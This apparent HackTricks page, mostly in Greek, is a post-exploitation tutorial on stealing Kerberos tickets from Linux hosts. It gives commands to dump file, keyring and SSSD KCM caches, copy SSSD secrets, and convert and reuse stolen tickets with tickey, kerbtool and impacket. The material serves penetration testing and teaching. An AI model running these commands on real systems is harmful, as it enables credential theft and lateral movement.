# Συλλογή εισιτηρίων από Linux

{{#include ../../banners/hacktricks-training.md}}

### Αποθήκευση διαπιστευτηρίων στο Linux

Τα συστήματα Linux αποθηκεύουν διαπιστευτήρια σε τρεις τύπους caches, συγκεκριμένα **Files** (στον κατάλογο `/tmp`), **Kernel Keyrings** (ένας ειδικός τομέας στον πυρήνα του Linux), και **Process Memory** (για χρήση από μία διεργασία). Η μεταβλητή **default_ccache_name** στο `/etc/krb5.conf` αποκαλύπτει τον τύπο αποθήκευσης που χρησιμοποιείται, με προεπιλογή `FILE:/tmp/krb5cc_%{uid}` αν δεν οριστεί.

MIT/Heimdal υποστηρίζουν επίσης επιπλέον backends που πρέπει να αναζητήσετε κατά τη διάρκεια post-exploitation:

- `DIR:/run/user/%{uid}/krb5cc` για caches πολλαπλών εισιτηρίων με αποθήκευση σε κατάλογο (προεπιλογή systemd-logind σε σύγχρονες διανομές).
- `KEYRING:persistent:%{uid}` ή `KEYRING:session` για αποθήκευση των ccaches μέσα στο kernel keyring (`KEY_SPEC_SESSION_KEYRING`, `KEY_SPEC_USER_KEYRING`, κ.λπ.).
- `KCM:%{uid}` όταν ο Kerberos Cache Manager daemon (kcm) του SSSD βρίσκεται μπροστά από την αποθήκευση εισιτηρίων.
- `MEMORY:unique_id` για caches τοπικές στη διεργασία που δημιουργούνται από βιβλιοθήκες (`gssproxy`, `sshd`, κ.λπ.).

Κάθε φορά που ανοίγετε ένα shell, εξάγετε το `KRB5CCNAME` από το `/proc/<pid>/environ` των ενδιαφερόντων daemon (π.χ. Apache, sshd, gssproxy) για να ξέρετε ποιο backend cache χρησιμοποιείται πριν αρχίσετε να αντιγράφετε αρχεία.

### Εντοπισμός ενεργών cache

Καταγράψτε τις cache πριν την εξαγωγή για να αποφύγετε να χάσετε εισιτήρια υψηλής αξίας:
```bash
$ klist -l            # list caches registered in the local keyring/KCM
$ klist -A            # show all ticket-granting tickets in the current cache
$ sudo keyctl get_persistent @u
$ sudo keyctl show `keyctl get_persistent @u`
$ sudo ls -al /tmp/krb5cc_* /run/user/*/krb5cc*
$ sudo find /proc -maxdepth 2 -name environ -exec sh -c 'tr "\0" "\n" < {} | grep -H KRB5' \;
```
Ο συνδυασμός των `klist`, `keyctl` και της επιθεώρησης του `/proc` αποκαλύπτει γρήγορα εάν τα διαπιστευτήρια βρίσκονται σε αρχεία, keyrings ή KCM, ώστε να επιλέξετε την κατάλληλη τεχνική εξαγωγής.

### Εξαγωγή διαπιστευτηρίων

Η εργασία του 2017, [**Kerberos Credential Thievery (GNU/Linux)**](https://www.delaat.net/rp/2016-2017/p97/report.pdf), περιγράφει μεθόδους για την εξαγωγή διαπιστευτηρίων από keyrings και processes, τονίζοντας τον μηχανισμό keyring του πυρήνα Linux για τη διαχείριση και αποθήκευση κλειδιών.

#### Επισκόπηση εξαγωγής από keyring

The **keyctl system call**, introduced in kernel version 2.6.10, allows user space applications to interact with kernel keyrings. Τα διαπιστευτήρια μέσα σε keyrings αποθηκεύονται ως συστατικά (default principal και credentials), ξεχωρίζοντας από τα file ccaches που περιλαμβάνουν επίσης ένα header. Το **hercules.sh script** από την εργασία δείχνει τον τρόπο εξαγωγής και ανασύνθεσης αυτών των συστατικών σε ένα χρησιμοποιήσιμο file ccache για κλοπή διαπιστευτηρίων. Να θυμάστε ότι τα ccaches αποθηκευμένα σε keyring μπορεί να βρίσκονται κάτω από `KEYRING:persistent:%{uid}` (μόνιμα μεταξύ συνδέσεων), `KEYRING:session` (εκκαθαρίζεται κατά το logout), ή ακόμα και `KEY_SPEC_THREAD_KEYRING` για υπηρεσίες που δημιουργούν βοηθητικά νήματα — οπότε κάντε πάντα απαρίθμηση όλων των τύπων keyring για το συμβιβασμένο UID.

#### Χειροκίνητη ροή εργασίας KEYRING

Μπορείτε να συλλέξετε χειροκίνητα tickets χωρίς βοηθητικά scripts όποτε το `default_ccache_name` είναι ρυθμισμένο σε `KEYRING:`:
```bash
$ KRING=$(keyctl get_persistent @u)
$ keyctl show $KRING                       # note the key serial of each ccache blob
$ keyctl pipe <serial> > /tmp/ccache_dump  # write raw blob to disk
$ KRB5CCNAME=/tmp/ccache_dump klist        # validate the stolen cache
```
Αν αποθηκεύονται πολλοί principals, επαναλάβετε το βήμα `keyctl pipe` για κάθε serial, στη συνέχεια μετατρέψτε το εξαγόμενο ccache σε συμβατό με Windows `.kirbi`/`.ccache` χρησιμοποιώντας εργαλεία όπως `kerbtool` (βλέπε παρακάτω) ή `ticketConverter.py` πριν το αναπαράγετε από άλλες μηχανές.

#### File/DIR Cache Theft Quick Wins

Όταν τα credentials αποθηκεύονται ως `FILE:` ή `DIR:` caches, απλές λειτουργίες αρχείων συνήθως αρκούν:
```bash
$ sudo cp /tmp/krb5cc_1000 /tmp/websvc.ccache
$ sudo cp -r /run/user/1000/krb5cc /tmp/user1000_dircc
$ chmod 600 /tmp/*.ccache && chown attacker /tmp/*.ccache
```
Directory caches contain one file per service ticket, so compress and exfiltrate the whole directory to keep TGT + TGS pairs intact. You can also point your tooling at the directory directly: `KRB5CCNAME=DIR:/tmp/user1000_dircc impacket-psexec ...`.

#### Εξαγωγή cache που διαχειρίζεται το KCM

Ο Kerberos Cache Manager του SSSD (kcm) δρομολογεί την αποθήκευση διαπιστευτηρίων μέσω `/var/run/kcm/kcmsock` (ή `/run/.heim_org.h5l.kcm-socket`) και αποθηκεύει μόνιμα κρυπτογραφημένα blobs μέσα σε `/var/lib/sss/secrets/` μαζί με το `.secrets.mkey`. Ροή επίθεσης:

1. Εντοπίστε τη χρήση του KCM μέσω του `/etc/krb5.conf` (`default_ccache_name = KCM:`) ή των εξόδων του `klist -l`.
2. Εάν έχετε UID 0 ή αν ανήκετε στο SELinux domain `kcm`, απαριθμήστε τις cache μέσω του εργαλείου διαχείρισης:
```bash
$ sudo kcm_ctl list                 # lists UID + cache IDs handled by kcm
$ sudo kcm_ctl get 1000 0 > /tmp/1000.kcm.ccache
$ KRB5CCNAME=/tmp/1000.kcm.ccache klist
```
3. Προσέγγιση εκτός σύνδεσης: αντιγράψτε τα `/var/lib/sss/secrets/secrets.ldb` και `/var/lib/sss/secrets/.secrets.mkey`, και στη συνέχεια τρέξτε `SSSDKCMExtractor` (ή παρόμοια PoC) για να αποκρυπτογραφήσετε και να ανασυνθέσετε τα ccaches χωρίς να πειράξετε το live socket. Αυτό είναι ιδιαίτερα χρήσιμο σε forensics ή όταν τα socket ACLs σας μπλοκάρουν αλλά η πρόσβαση στο δίσκο είναι δυνατή.

Επειδή το kcm daemon τηρεί τα UID-based ACLs που επιβάλλει το SSSD, συνήθως απαιτείται privilege escalation σε root (ή ο συμβιβασμός του `sssd_kcm`), αλλά μόλις επιτευχθεί μπορείτε να dump το TGT κάθε χρήστη σε δευτερόλεπτα.

### Εργαλεία Εξαγωγής Εισιτηρίων

Η αυτοματοποίηση των παραπάνω βημάτων μειώνει τα λάθη και σας παρέχει cross-platform υλικό εισιτηρίων που μπορείτε να αναπαράγετε από Windows tooling.

#### Tickey

Βασισμένο στις αρχές του **hercules.sh script**, το [**tickey**](https://github.com/TarlogicSecurity/tickey) εργαλείο έχει σχεδιαστεί ειδικά για την εξαγωγή tickets από keyrings, εκτελούμενο μέσω `/tmp/tickey -i`. Απαριθμεί τα kernel keyrings, ανασυνθέτει τα σειριοποιημένα ccaches και γράφει MIT-compatible αρχεία cache που μπορείτε αμέσως να δώσετε στο `klist`, `impacket-*` ή στο `kerberoast` tooling.

#### Kerbtool

[**kerbtool**](https://github.com/jfjallid/kerbtool) είναι ένα σύγχρονο Go utility που τρέχει εγγενώς σε Linux και μπορεί να αναλύει, να μετατρέπει και να αιτείται Kerberos tickets. Δύο χρήσιμες περιπτώσεις χρήσης όταν κάνετε harvesting από Linux boxes:
```bash
# Convert a stolen MIT ccache into a .kirbi usable by Windows tooling
$ ./kerbtool --convert --in /tmp/websvc.ccache --out websvc.kirbi

# Use an extracted cache to request additional TGS tickets without touching the victim again
$ KRB5CCNAME=/tmp/websvc.ccache ./kerbtool --ask --spn cifs/fileserver.lab.local
```
Το να έχετε τόσο το tickey όσο και το kerbtool στον implant host σας, σας επιτρέπει να μετακινείστε απρόσκοπτα ανάμεσα σε Linux, Windows και cross-platform Kerberos attack chains.

## Αναφορές

- [**https://www.tarlogic.com/en/blog/how-to-attack-kerberos/**](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
- [**https://docs.pagure.org/sssd.sssd/design_pages/kcm.html**](https://docs.pagure.org/sssd.sssd/design_pages/kcm.html)
- [**https://github.com/jfjallid/kerbtool**](https://github.com/jfjallid/kerbtool)

{{#include ../../banners/hacktricks-training.md}}
